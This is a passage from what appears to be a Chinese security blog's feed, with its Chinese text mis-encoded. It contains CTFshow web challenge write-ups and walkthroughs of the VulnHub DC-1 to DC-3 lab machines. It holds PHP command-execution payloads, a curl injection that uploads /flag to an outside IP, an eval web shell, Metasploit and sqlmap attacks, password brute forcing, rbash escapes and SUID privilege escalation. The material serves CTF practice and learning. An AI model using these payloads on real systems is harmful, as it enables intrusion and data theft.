<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=system(pos(getallheaders()));</span><br><span class="line">getallheaders() è·å–è¯·æ±‚å¤´ä¿¡æ¯</span><br><span class="line">pos() è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ï¼ˆä¸€èˆ¬å°±æ˜¯ç¬¬ä¸€ä¸ªäº†ï¼‰</span><br><span class="line">end() è¿”å›æœ€åä¸€ä¸ª</span><br></pre></td></tr></table></figure>

<p>æ–¹æ³•äºŒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=system(end(pos(get_defined_vars())));&amp;shell=cat%20/secret_you_never_know</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get_defined_vars() å‡½æ•°è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„</span><br></pre></td></tr></table></figure>

<h2 id="687"><a href="#687" class="headerlink" title="687"></a>687</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    <span class="variable">$target</span>=<span class="title function_ invoke__">trim</span>(<span class="variable">$target</span>);</span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;|&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target</span> = <span class="title function_ invoke__">str_replace</span>( <span class="title function_ invoke__">array_keys</span>( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> );</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">shell_exec</span>( <span class="string">&#x27;ping  -c 1 &#x27;</span> . <span class="variable">$target</span> );</span><br><span class="line">    <span class="keyword">echo</span>  <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>%0aç»•è¿‡è¿‡æ»¤ç®¡é“ç¬¦</p>
<p>paylaoad:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=1%0acat%20/f*%0a</span><br></pre></td></tr></table></figure>

<h2 id="688"><a href="#688" class="headerlink" title="688"></a>688</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//flag in /flag</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$urlInfo</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(!(<span class="string">&quot;http&quot;</span> === <span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>]) || <span class="string">&quot;https&quot;</span>===<span class="title function_ invoke__">strtolower</span>(<span class="variable">$urlInfo</span>[<span class="string">&quot;scheme&quot;</span>])))&#123;</span><br><span class="line">    <span class="keyword">die</span>( <span class="string">&quot;scheme error!&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"><span class="variable">$url</span>=<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;curl &quot;</span>.<span class="variable">$url</span>);</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url=http://101.43.182.125:5000/&#x27; -F file=@/flag &#x27;</span><br></pre></td></tr></table></figure>

<p><a href="https://php.golaravel.com/install.pecl.windows.html">PECL æ‰©å±•åº“å®‰è£… Â« PHP Manual | PHP ä¸­æ–‡æ‰‹å†Œ (golaravel.com)</a></p>
<p><a href="https://pecl.php.net/package/mcrypt/1.0.4/windows">PECL ï¼šï¼š è½¯ä»¶åŒ… ï¼šï¼š mcrypt 1.0.4 for Windows (php.net)</a></p>
<p>ç„¶åç›´æ¥è¿è¡Œå³å¯</p>
<h2 id="689"><a href="#689" class="headerlink" title="689"></a>689</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$path</span> = <span class="string">&quot;upload/&quot;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$path</span>,<span class="string">&#x27;..&#x27;</span>) &gt; -<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;This is a waf!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>,<span class="string">&#x27;http://127.0.0.1/&#x27;</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>, <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;console.log(<span class="subst">$path</span> update successed!)&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello.CTFshow&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜æœ‰ç‚¹ç»•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET) &amp;&amp; !empty($_GET))&#123;</span><br><span class="line">    $url = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $path = &quot;upload/&quot;.$_GET[&#x27;path&#x27;];</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">echo $url;</span><br></pre></td></tr></table></figure>

<p>æœ¬åœ°æ­å»º url çš„å€¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/?file=http://127.0.0.1/&amp;path=&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure>

<p>pathçš„å€¼</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload/2.php</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥å†™å…¥çš„æ˜¯2.php ä½†æ˜¯é€šè¿‡file_get_content,æ”¹å˜äº†æ•°å€¼å˜æˆäº†æ–°çš„path</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=http://127.0.0.1/?file=http://127.0.0.1/%26path=&lt;?php eval($_POST[1]);?&gt;&amp;path=2.php</span><br></pre></td></tr></table></figure>

<h2 id="690æœªå†™"><a href="#690æœªå†™" class="headerlink" title="690æœªå†™"></a>690æœªå†™</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$args</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;args&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$args</span>); <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\w+$/&#x27;</span>, <span class="variable">$args</span>[<span class="variable">$i</span>]) )</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;sorry&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="string">&#x27;./ &#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&quot; &quot;</span>, <span class="variable">$args</span>));</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;Hello&#x27;</span>,<span class="string">&#x27;World!&#x27;</span>,<span class="string">&#x27;Beautiful&#x27;</span>,<span class="string">&#x27;Day!&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">implode</span>(<span class="string">&quot; &quot;</span>,<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#Hello World! Beautiful Day!</span></span><br></pre></td></tr></table></figure>

<p>implode() å‡½æ•°è¿”å›ä¸€ä¸ªç”±æ•°ç»„å…ƒç´ ç»„åˆæˆçš„å­—ç¬¦ä¸²ã€‚</p>
<p><a href="https://tool.520101.com/wangluo/jinzhizhuanhuan/">IPåœ°å€è¿›åˆ¶è½¬æ¢ (520101.com)</a></p>
<h2 id="691"><a href="#691" class="headerlink" title="691"></a>691</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;inc.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span>   <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">      <span class="variable">$filterlist</span> = <span class="string">&quot;/\(|\)|username|password|where|</span></span><br><span class="line"><span class="string">      case|when|like|regexp|into|limit|=|for|;/&quot;</span>;</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$filterlist</span>,<span class="title function_ invoke__">strtolower</span>(<span class="variable">$str</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;illegal input!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])?</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]):<span class="keyword">die</span>(<span class="string">&quot;please input username!&quot;</span>);</span><br><span class="line"><span class="variable">$password</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])?</span><br><span class="line"><span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]):<span class="keyword">die</span>(<span class="string">&quot;please input password!&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from admin where  username =</span></span><br><span class="line"><span class="string"> &#x27;<span class="subst">$username</span>&#x27; and password = &#x27;<span class="subst">$password</span>&#x27; &quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span> = <span class="variable">$conn</span> -&gt; <span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$res</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;</span><br><span class="line">  <span class="variable">$row</span> = <span class="variable">$res</span> -&gt; <span class="title function_ invoke__">fetch_assoc</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>])&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;The content in the password column is the flag!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="692æœªå†™"><a href="#692æœªå†™" class="headerlink" title="692æœªå†™"></a>692æœªå†™</h2><h2 id="693"><a href="#693" class="headerlink" title="693"></a>693</h2><h2 id="695"><a href="#695" class="headerlink" title="695"></a>695</h2><h2 id="800"><a href="#800" class="headerlink" title="800"></a>800</h2>]]></content>
  </entry>
  <entry>
    <title>dcç³»åˆ—</title>
    <url>/2023/06/25/dc%E7%B3%BB%E5%88%97/</url>
    <content><![CDATA[<p> dcç³»åˆ—</p>
<span id="more"></span>

<h2 id="dc-1"><a href="#dc-1" class="headerlink" title="dc-1"></a>dc-1</h2><p>é¶æœºå®‰è£…</p>
<p>æ‰“å¼€ç½‘å€å‘ç°drupal,ç›´æ¥ç”¨ä¹‹å‰çš„è„šæœ¬æ‰“å°±è¡Œï¼Œ</p>
<p>ä½†æ˜¯è¿™é‡Œåˆ—å‡ºç¬¬äºŒä¸ªæ–¹æ³•ï¼Œç›´æ¥ç”¨msfå¥½åƒæ›´çœäº‹</p>
<p>è¿›å…¥msf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search drupal</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230625201250.png"></p>
<p>è¿™é‡Œç”¨ç¬¬ä¸€ä¸ª</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use 1</span><br></pre></td></tr></table></figure>

<p>è®¾ç½®ä¸€ä¸‹ç›®æ ‡ ï¼Œrun,è¿›å…¥shell</p>
<p>cat flag1.txt<br>Every good CMS needs a config file - and so do you.</p>
<p>è¿™æ˜¯ç¬¬ä¸€ä¸ªflag,å¹¶æé†’çœ‹fé…ç½®æ–‡ä»¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@DC-1:/var/www/sites/default$ cat settings.php</span><br></pre></td></tr></table></figure>

<p>å†…å®¹å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren&#x27;t the</span><br><span class="line"> * only ways to gain access (and you WILL need access).</span><br><span class="line"> * What can you do with these credentials?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">$databases = array (</span><br><span class="line">  &#x27;default&#x27; =&gt; </span><br><span class="line">  array (</span><br><span class="line">    &#x27;default&#x27; =&gt; </span><br><span class="line">    array (</span><br><span class="line">      &#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,</span><br><span class="line">      &#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,</span><br><span class="line">      &#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,</span><br><span class="line">      &#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span><br><span class="line">      &#x27;port&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">      &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,</span><br><span class="line">      &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ˜¯ç¬¬äºŒä¸ªflagï¼Œå¹¶è·å¾—æ•°æ®åº“çš„è´¦å·å¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u dbuser -p</span><br><span class="line">R0ck3t</span><br><span class="line">use drupaldb;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure>

<p>å‘ç°æ•°æ®åº“è¢«åŠ å¯†ï¼Œè€Œä¸”ä¸åƒæ˜¯md5 åŠ å¯†ï¼Œflag2 æç¤ºä¸æ˜¯æš´åŠ›ç ´è§£ï¼Œæ‰€ä»¥æ‰¾åˆ°åŠ å¯†æ–¹å¼å³å¯ã€‚</p>
<p>åœ¨scripts ä¸‹æœ‰åŠ å¯†è„šæœ¬password-hash.sh</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php scripts/password-hash.sh 123456</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230625210716.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$S$D/6o8k.0p794/LgicJmM5ZiuL5KYzyWUa7KBeACEHloSB/aio0By</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update users set pass=&#x27;$S$D/6o8k.0p794/LgicJmM5ZiuL5KYzyWUa7KBeACEHloSB/aio0By&#x27; where name=&#x27;admin&#x27;;</span><br></pre></td></tr></table></figure>

<p>ç„¶åç™»å½•,åœ¨contentæ‹¿åˆ°flag3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Special PERMS will help FIND the passwd - but you&#x27;ll need to -exec that command to work out how to get what&#x27;s in the shadow.</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥ææƒï¼Œå‘ç°msf æ²¡æœ‰å•¥ææƒå»ºè®®ï¼Œ</p>
<p>ç¬¬å››ä¸ªflag åœ¨ &#x2F;home&#x2F;flag4&#x2F;flagg4.txt</p>
<p>Can you use this same method to find or access the flag in root?</p>
<p>suid ææƒ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230625213554.png"></p>
<p> å‘ç°find,</p>
<h3 id="suid-find-ææƒ"><a href="#suid-find-ææƒ" class="headerlink" title="suid find ææƒ"></a>suid find ææƒ</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir test</span><br><span class="line">find test -exec &#x27;/bin/sh&#x27; \;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230625221245.png"></p>
<p>æœ€åçš„flag </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Well done!!!!</span><br><span class="line">Hopefully you&#x27;ve enjoyed this and learned some new skills.</span><br><span class="line">You can let me know what you thought of this little journey</span><br><span class="line">by contacting me via Twitter - @DCAU7</span><br></pre></td></tr></table></figure>

<h2 id="dc-2"><a href="#dc-2" class="headerlink" title="dc-2"></a>dc-2</h2><p>ä¸‹è½½åœ°å€<a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a></p>
<p>å®‰è£…æ‰«æ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.158.0/24 -sn</span><br><span class="line">nmap -sV -A -p- 192.168.158.162</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230630171454.png"></p>
<p>è®¿é—®ï¼Œå‘ç°è®¿é—®ä¸äº† ï¼Œå¯„äº†ï¼Œçœ‹å¸ˆå‚…çš„wp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc</span><br></pre></td></tr></table></figure>

<p>ç¼–è¾‘ hosts,æ·»åŠ å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.158.162 dc-2</span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—®æˆåŠŸï¼Œè®¿é—®,å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªflag</p>
<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230630171316.png"></p>
<p>æç¤ºä½¿ç”¨cewl,ä¸€ä¸ªç”Ÿæˆå­—å…¸çš„å·¥å…·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl http://dc-2 -w passwd.txt</span><br></pre></td></tr></table></figure>

<h3 id="wpscan"><a href="#wpscan" class="headerlink" title="wpscan"></a>wpscan</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --ignore-main-redirect --url http://dc-2 --enumerate u --force</span><br></pre></td></tr></table></figure>

<p>å­˜åœ¨ä¸‰ä¸ªç”¨æˆ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin tom jerry</span><br></pre></td></tr></table></figure>

<p>æœ‰å¯†ç ï¼Œæœ‰å­—å…¸ï¼Œçˆ†ç ´ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wpscan --url http://dc-2/ -U users.txt -P passwd.txt</span><br></pre></td></tr></table></figure>

<p>çˆ†ç ´ç»“æœ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jerry / adipiscing                                                                       </span><br><span class="line">tom / parturient  </span><br></pre></td></tr></table></figure>

<p>ç™»å½•ï¼Œæç¤ºåå°æ‹¿ä¸åˆ°shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag 2:</span><br><span class="line"></span><br><span class="line">If you can&#x27;t exploit WordPress and take a shortcut, there is another way.</span><br><span class="line"></span><br><span class="line">Hope you found another entry point.</span><br></pre></td></tr></table></figure>

<p>å‘ç°cat nl ç­‰å‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compgen -c       //æŸ¥çœ‹å¯ä»¥ä½¿ç”¨çš„æŒ‡ä»¤</span><br></pre></td></tr></table></figure>

<p>vi flag*</p>
<p>flag3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">oor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/qq_43168364/article/details/111830233">(5æ¡æ¶ˆæ¯) ã€æ¸—é€æµ‹è¯•ã€‘â€” rbashé€ƒé€¸æ–¹æ³•ç®€è¿°_rbash å‘½ä»¤_é€šåœ°å¡”çš„åšå®¢-CSDNåšå®¢</a></p>
<h3 id="rbashé€ƒé€¸ç»•è¿‡"><a href="#rbashé€ƒé€¸ç»•è¿‡" class="headerlink" title="rbashé€ƒé€¸ç»•è¿‡"></a>rbashé€ƒé€¸ç»•è¿‡</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//æ–°å»ºä¸€ä¸ªæ–‡ä»¶ï¼Œæœ«è¡Œå‘½ä»¤ï¼Œå›è½¦</span><br><span class="line">vi test</span><br><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br><span class="line">//è®¾ç½®ç¯å¢ƒå˜é‡</span><br><span class="line">vi test</span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin/</span><br></pre></td></tr></table></figure>

<p>ä¹‹åå°±èƒ½æ­£å¸¸å‘½ä»¤æ‰§è¡Œäº†,cd åˆ°jerry ,ç¬¬å››ä¸ªflag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Good to see that you&#x27;ve made it this far - but you&#x27;re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you&#x27;re on your own now.  :-)</span><br><span class="line"></span><br><span class="line">Go on - git outta here!!!!</span><br></pre></td></tr></table></figure>



<p>sudo -l å‘ç°æç¤º</p>
<p>å¯ä»¥ç”¨git ææƒ</p>
<h3 id="suid-git-ææƒ"><a href="#suid-git-ææƒ" class="headerlink" title="suid git ææƒ"></a>suid git ææƒ</h3><p><strong>(æˆ‘ä»¬éœ€è¦å°†shellçš„çª—å£å˜çª„,ä½¿å¾—å›æ˜¾ä¿¡æ¯ä¸èƒ½ä¸€é¡µæ˜¾ç¤º)é‡ç‚¹</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo git help config #ç„¶åä¼šå‡ºç°:è¾“å…¥æ¡†ï¼Œå›æ˜¾ä¿¡æ¯ä¸èƒ½ä¸€é¡µæ˜¾ç¤ºæ‰æœ‰</span><br><span class="line">ç„¶åè¾“å…¥</span><br><span class="line">!/bin/bash æˆ– !&#x27;sh&#x27; #å®Œæˆææƒ</span><br></pre></td></tr></table></figure>

<p>æœ€åçš„flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Congratulatons!!!</span><br><span class="line"></span><br><span class="line">A special thanks to all those who sent me tweets</span><br><span class="line">and provided me with feedback - it&#x27;s all greatly</span><br><span class="line">appreciated.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>

<h2 id="dc-3"><a href="#dc-3" class="headerlink" title="dc-3"></a>dc-3</h2><p>wappalyzer æ‰«æä¸€ä¸‹</p>
<p>å‘ç°joomla phpæ¡†æ¶</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">doomlscan -u http://192.168.158.160</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708163601.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Joomla 3.7.0</span><br><span class="line">searchsploit -p 42033.txt</span><br><span class="line">cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.158.160/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.158.160/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot; -p list[fullordering] --batch --tables</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.158.160/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot;  -T &quot;#__users&quot; --columns  -p list[fullordering]</span><br></pre></td></tr></table></figure>

<p>çˆ†å‡ºå¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.158.160/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent -D &quot;joomladb&quot;  -T &quot;#__users&quot; -C &quot;name,password,username&quot;  -p list[fullordering] --dump</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/25/dc%E7%B3%BB%E5%88%97/QQ%E6%88%AA%E5%9B%BE20230708193816.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john 1.txt è§£å¯†md5</span><br></pre></td></tr></table></figure>

